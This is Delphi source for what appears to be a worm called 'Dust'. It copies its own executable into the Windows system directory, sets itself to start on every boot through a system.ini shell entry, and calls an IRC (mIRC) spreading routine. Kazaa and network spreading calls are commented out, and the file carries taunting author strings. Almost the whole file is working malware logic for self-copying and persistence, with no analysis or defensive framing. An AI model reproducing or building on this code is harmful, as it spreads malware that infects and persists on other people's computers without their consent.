   program Dust;
   uses
     windows,
     sysutils,
     kazaa,
     irc,
     network,
     Main in 'Main.pas';

   const
     dust1:string='You fall and hit the ground, and teh dust has you';
     dust2:string='Crow, i love u.';
   var buf:array[0..455]of char;s:string;
   begin

    getsystemdirectory(buf,255);
    s:= buf;
    s := s + '\dust.exe';
    copyfile(pchar(paramstr(0)),pchar(s),false);
    writeprivateprofilestring('boot','shell',pchar('Explorer.exe dust.exe'),'system.ini');
   //kazaait;
   //GoNetwork;
   mirc;

   end.
